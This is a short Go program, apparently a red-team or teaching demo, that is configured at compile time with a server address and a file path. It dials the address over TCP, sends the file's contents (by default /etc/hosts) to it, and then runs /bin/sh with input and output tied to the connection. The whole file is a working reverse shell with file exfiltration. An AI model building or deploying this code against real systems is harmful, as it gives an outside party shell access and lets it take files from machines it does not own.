// Program argv_from_source - shello_world with baked-in config
package main

/*
 * argv_from_source.go
 * shello_world, but with baked-in config
 * By J. Stuart McMurray
 * Created 20240901
 * Last Modified 20240902
 */

import (
	"log"
	"net"
	"os"
	"os/exec"
)

// Compile-time configurables
var (
	Address = "localhost:4444"
	File    = "/etc/hosts"
)

func main() {
	/* Connect to the server. */
	c, err := net.Dial("tcp", Address)
	if nil != err {
		log.Fatalf("Error connecting to server: %s", err)
	}

	/* Send back the file. */
	b, err := os.ReadFile(File)
	if nil != err {
		log.Fatalf("Error reading file: %s", err)
	}
	if _, err := c.Write(b); nil != err {
		log.Printf("Error sending file: %s", err)
	}

	/* Spawn a shell. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = c
	sh.Stdout = c
	sh.Stderr = c
	if err := sh.Run(); nil != err {
		log.Fatalf("Shell died: %s", err)
	}
}
